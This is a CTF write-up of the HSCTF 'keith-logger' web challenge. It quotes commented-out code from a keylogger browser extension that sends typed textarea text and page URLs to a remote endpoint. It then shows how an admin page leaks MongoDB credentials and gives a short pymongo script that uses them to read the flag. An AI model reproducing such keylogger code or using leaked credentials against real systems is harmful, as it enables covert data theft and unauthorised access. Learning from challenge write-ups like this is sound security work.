##### This problem was only partially solved by Golems_treat during the CTF
## Problem info
<table>
  <tr>
    <td><strong>Name</strong></td>
    <td>keith-logger</td>
  </tr>
  <tr>
    <td><strong>Category</strong></td>
    <td>Web</td>
  </tr>
  <tr>
    <td><strong>Message</strong></td>
    <td>Written by: dwang<br>
Keith is up to some evil stuff! Can you figure out what he's doing and find the flag?<br>
Note: nothing is actually saved<br>
</td>
  </tr>
  <tr>
    <td><strong>Flags</strong></td>
    <td>hsctf{watch_out_for_keyloggers}</td>
  </tr>
  <tr>
    <td><strong>Files</strong></td>
    <td>extension.crx</td>
  </tr>
  <tr>
    <td><strong>Tags</strong></td>
    <td>Web</td>
  </tr>
  <tr>
    <td><strong>Hints</strong></td>
    <td></td>
  </tr>
</table>

## Solutions during CTF

Using Google Chrome extension `Chrome extension source viewer` and we can see the source code of extension.crx, the files are in [./src/extension](./src/extension)  

In [./src/extension/content.js](./src/extension/content.js), we see interesting comments

```
    /*
    xhr.open(
      "GET",
      "https://keith-logger.web.chal.hsctf.com/api/record?text=" +
        encodeURIComponent($("textarea").val()) +
        "&url=" + encodeURIComponent(window.location.href),
      true
    );*/


    // send a request to admin whenever something is logged, not needed anymore after testing
    /*
    xhr.open(
      "GET",
      "https://keith-logger.web.chal.hsctf.com/api/admin",
      true
    );*/
```

therefore I tried to visit the two mentioned website : https://keith-logger.web.chal.hsctf.com/api/record and https://keith-logger.web.chal.hsctf.com/api/admin

The former one simply feed backs the user providing varibles and the requesting time, for example :

**https://keith-logger.web.chal.hsctf.com/api/record?text=Golem&url=_treat**
```
{'text': 'Golem', 'url': '_treat', 'time': '11:53:17.092162'}
```

However the latter one writes something interesting
**https://keith-logger.web.chal.hsctf.com/api/admin**
```
didn't have time to implement this page yet. use admin:keithkeithkeith@keith-logger-mongodb.web.chal.hsctf.com:27017 for now
```

so now I've got the username and the port
Try to visit the website, the browser bumps out
**http://keith-logger-mongodb.web.chal.hsctf.com:27017/**
```
It looks like you are trying to access MongoDB over HTTP on the native driver port.
```

And that's all I did on this problem during the CTF

## After CTF

Somehow I just stopped at one way away from the flag. There are several ways to access MongoDB, such as the application MongoDB itself...

or we could simply take advantage of its python API  

```
from pymongo import MongoClient
r = MongoClient('mongodb://admin:keithkeithkeith@keith-logger-mongodb.web.chal.hsctf.com', 27017)
cursor = r['database']['collection'].find({})
for document in cursor:
  print document
```

and we could see the flag ```hsctf{watch_out_for_keyloggers}```


## Remarks:

Thanks to the [writeup provided by x0rc3r3rs](http://itsvipul.com/writeups/HSCTF/logger.html), the writeup says: 
> Chrome extension (.crx) files are nothing more than zip files.

That is to say, we could simply unzip the file without the Chrome Extension. 
